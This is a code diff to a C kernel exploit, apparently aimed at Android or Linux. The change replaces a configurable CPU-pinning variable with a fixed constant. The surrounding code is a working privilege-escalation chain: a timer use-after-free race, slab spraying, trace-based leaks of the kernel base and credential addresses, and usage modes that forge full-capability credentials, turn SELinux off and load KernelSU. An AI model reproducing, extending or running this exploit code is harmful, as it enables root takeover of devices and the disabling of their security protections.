@@ -94,7 +94,6 @@ static void *g_frag_base;
 static size_t g_frag_len;
 static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
 static int g_timer_go_r = -1, g_timer_go_w = -1;
-static int g_cpu = CPU_TRIG;
 static unsigned long long g_base;
 static unsigned long long g_slide;
 static int g_held;
@@ -226,7 +225,7 @@ static void trace_start(void)
 {
     wr(TR "/tracing_on", "0");
     wr(TR "/trace", "\n");
-    drain_cpu(g_cpu);
+    drain_cpu(CPU_TRIG);
     wr(TR "/tracing_on", "1");
 }
 static void trace_stop(void) { wr(TR "/tracing_on", "0"); }
@@ -404,7 +403,7 @@ static int discover_page_types(unsigned char *raw)
     usleep(30000);
     trace_stop();
 
-    n = read_cpu(g_cpu, raw, 32u << 20);
+    n = read_cpu(CPU_TRIG, raw, 32u << 20);
     if (n <= 0)
         return -1;
     for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
@@ -583,7 +582,7 @@ static unsigned long long calibrate_base(unsigned char *raw)
     }
     usleep(3000);
     trace_stop();
-    n = read_cpu(g_cpu, raw, 32u << 20);
+    n = read_cpu(CPU_TRIG, raw, 32u << 20);
     if (n <= 0)
         return 0;
 
@@ -738,7 +737,7 @@ static int killer_fn(void *x)
     int tid, tgid;
     (void)x;
     prctl(PR_SET_NAME, g_helper_name, 0, 0, 0);
-    pin(2);
+    pin(CPU_TRIG);
     while (!(tid = atomic_load(&g_exec_tid)))
     {
         if (target_gone())
@@ -777,7 +776,7 @@ static void *exec_thread(void *x)
     char *const argv[] = {(char *)"", NULL};
     char *const envp[] = {NULL};
     (void)x;
-    pin(2);
+    pin(CPU_TRIG);
     prctl(PR_SET_NAME, "yexec", 0, 0, 0);
     memset(&ev_none, 0, sizeof(ev_none));
     ev_none.sigev_notify = SIGEV_NONE;
@@ -830,7 +829,7 @@ static void run_target(void)
     pthread_t th;
     sigset_t set;
     atomic_store(&g_target_tgid, (int)getpid());
-    pin(2);
+    pin(CPU_TRIG);
     if (prepare_fragmented_range())
         _exit(110);
     for (int i = 0; i < LOCKERS; i++)
@@ -1339,7 +1338,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
      * the slab pfn and the linear-map base now, before the exec/free, so the
      * spray is already running when the victim slab returns to the buddy.
      */
-    long n = read_cpu(g_cpu, raw, 48u << 20);
+    long n = read_cpu(CPU_TRIG, raw, 48u << 20);
     unsigned long long kept[NTIMERS];
     unsigned long long V = 0, site0 = 0;
     unsigned long long vslab;
@@ -1751,7 +1750,7 @@ static unsigned long long leak_cred(unsigned char *raw,
             close(g2);
             dup2(s2, 4);
             close(s2);
-            pin(g_cpu);
+            pin(CPU_TRIG);
             if (read(3, &ch, 1) != 1)
                 _exit(126);
             {
@@ -1778,7 +1777,7 @@ static unsigned long long leak_cred(unsigned char *raw,
             logf("[!] leak go write failed\n");
         usleep(50000);
         trace_stop();
-        n = read_cpu(g_cpu, raw, 48u << 20);
+        n = read_cpu(CPU_TRIG, raw, 48u << 20);
         if (n > 0)
         {
             c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
@@ -1865,7 +1864,7 @@ static int wait_child_main(const char *mode)
     char ch;
     int hello = CHILD_HELLO;
 
-    pin(g_cpu);
+    pin(CPU_TRIG);
     if (write(4, &hello, sizeof(hello)) != sizeof(hello))
         _exit(130);
     if (read(3, &ch, 1) != 1)
@@ -2142,7 +2141,6 @@ static void usage(const char *prog)
     printf("  fake           full-capability fake cred + SELinux off + KernelSU late-load\n");
     printf("  leak           leak child cred + task only, then exit (no escalation)\n");
     printf("  ids            portable OS diag (no UAF): sysinfo/slab + timer/cred/task hists + base preview\n");
-    printf("  cpu <n>        pin to CPU <n>  (e.g. %s cpu 2 shell)\n", prog);
     printf("  wait <m>       internal child mode (not for direct use)\n");
     printf("  --help | -h    this help\n");
     printf("\nnotes:\n");
@@ -2204,8 +2202,6 @@ int main(int argc, char **argv)
     raw = malloc(48u << 20);
     if (!raw)
         return 1;
-    if (argc > 2 && !strcmp(argv[1], "cpu"))
-        g_cpu = atoi(argv[2]);
 
     if (argv[0] && argv[0][0] == '\0')
         _exit(42);
@@ -2222,9 +2218,9 @@ int main(int argc, char **argv)
         }
     }
 
-    pin(g_cpu);
+    pin(CPU_TRIG);
     (void)setpriority(PRIO_PROCESS, 0, -20);
-    logf("[+] pid=%d cpu=%d nice=%d\n", getpid(), g_cpu,
+    logf("[+] pid=%d cpu=%d nice=%d\n", getpid(), CPU_TRIG,
          getpriority(PRIO_PROCESS, 0));
     enable_events();
     kick_rss();
@@ -2308,7 +2304,7 @@ int main(int argc, char **argv)
             }
             usleep(3000);
             trace_stop();
-            n = read_cpu(g_cpu, raw, 32u << 20);
+            n = read_cpu(CPU_TRIG, raw, 32u << 20);
             if (n > 0)
             {
                 unsigned long long site = 0;
@@ -2350,7 +2346,7 @@ int main(int argc, char **argv)
                     close(g2);
                     dup2(s2, 4);
                     close(s2);
-                    pin(g_cpu);
+                    pin(CPU_TRIG);
                     if (read(3, &ch, 1) != 1)
                         _exit(126);
                     {
@@ -2371,7 +2367,7 @@ int main(int argc, char **argv)
                     if (write(go[1], "A", 1) == 1)
                         usleep(50000);
                     trace_stop();
-                    n2 = read_cpu(g_cpu, raw, 48u << 20);
+                    n2 = read_cpu(CPU_TRIG, raw, 48u << 20);
                     if (n2 > 0)
                     {
                         int cred_recs = scan_cred_allocs(raw, (size_t)n2, (int)p,
